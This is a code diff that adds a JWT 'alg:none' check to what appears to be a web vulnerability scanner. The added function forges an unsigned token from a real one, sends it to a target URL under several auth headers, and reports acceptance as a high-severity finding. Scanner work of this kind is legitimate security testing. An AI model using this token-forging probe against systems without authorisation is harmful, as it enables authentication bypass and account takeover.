@@ -1,3 +1,5 @@
+import base64
+import json
 import logging
 import time
 
@@ -105,3 +107,57 @@ def detect_framework(response) -> str:
     if "magento" in body:
         return "Magento"
     return "unknown"
+
+
+def test_jwt_alg_none(
+    jwt_token: str,
+    target_url: str,
+    request_func,
+    auth_headers: list[str] | None = None,
+) -> dict | None:
+    """Test JWT for 'alg:none' vulnerability.
+
+    Takes a JWT token, modifies its header to use 'none' algorithm,
+    and tests if the server accepts it via the provided request function.
+
+    Args:
+        jwt_token: The original JWT token string.
+        target_url: The URL to test against.
+        request_func: A callable (url, headers) -> Response | None.
+        auth_headers: List of auth header names to try.
+
+    Returns:
+        A finding dict if vulnerable, None otherwise.
+    """
+    parts = jwt_token.split(".")
+    if len(parts) != 3:
+        return None
+    try:
+        json.loads(base64.urlsafe_b64decode(parts[0] + "==").decode("utf-8"))
+    except Exception:
+        return None
+
+    none_header = base64.urlsafe_b64encode(
+        json.dumps({"alg": "none", "typ": "JWT"}).encode()
+    ).decode().rstrip("=")
+    none_jwt = f"{none_header}.{parts[1]}."
+
+    if auth_headers is None:
+        auth_headers = ["Authorization", "X-Access-Token", "Token"]
+
+    for auth_header in auth_headers:
+        resp = request_func(target_url, {auth_header: f"Bearer {none_jwt}"})
+        if resp is not None and resp.status_code == 200:
+            return {
+                "type": "JWT_ALGORITHM_CONFUSION",
+                "severity": "HIGH",
+                "endpoint": target_url,
+                "evidence": {
+                    "original_jwt": jwt_token[:20] + "...",
+                    "test_algorithm": "none",
+                    "auth_header": auth_header,
+                    "message": "Server accepted JWT with alg:none",
+                },
+                "confidence": 0.7,
+            }
+    return None
